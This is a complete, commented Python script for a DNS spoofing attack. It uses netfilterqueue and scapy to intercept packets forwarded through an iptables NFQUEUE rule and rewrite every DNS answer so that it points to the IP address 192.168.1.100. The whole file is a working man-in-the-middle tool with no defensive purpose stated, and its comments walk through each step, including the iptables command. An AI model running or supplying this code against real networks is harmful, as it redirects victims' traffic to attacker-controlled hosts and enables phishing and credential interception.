#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    """
    This function processes packets intercepted by the netfilterqueue library and modifies their DNS response packet to
    change the DNS record to a spoofed IP address.
    """
    # Convert the packet payload to a Scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet is a DNS response packet
    if scapy_packet.haslayer(scapy.DNSRR):
        # Get the DNS response record
        dns_response = scapy_packet[scapy.DNSRR]

        # Replace the real IP address with the spoofed IP address
        # In this example, we are using "192.168.1.100" as the spoofed IP address
        dns_response.rdata = "192.168.1.100"

        # Set the DNS response packet's length and checksum to 0 to force Scapy to recalculate them
        # This is necessary to avoid packet corruption
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum

        # Set the packet payload to the modified Scapy packet
        packet.set_payload(bytes(scapy_packet))

    # Accept the packet to forward it to the destination host
    packet.accept()

# Create a netfilterqueue object
queue = netfilterqueue.NetfilterQueue()

# Bind the netfilterqueue object to the iptables rule
# In this example, we are using the iptables rule "iptables -I FORWARD -j NFQUEUE --queue-num 0"
queue.bind(0, process_packet)

# Start the netfilterqueue loop
try:
    queue.run()
except KeyboardInterrupt:
    print("[+] Quitting DNS spoofer & blocker...")

    
    
    
    
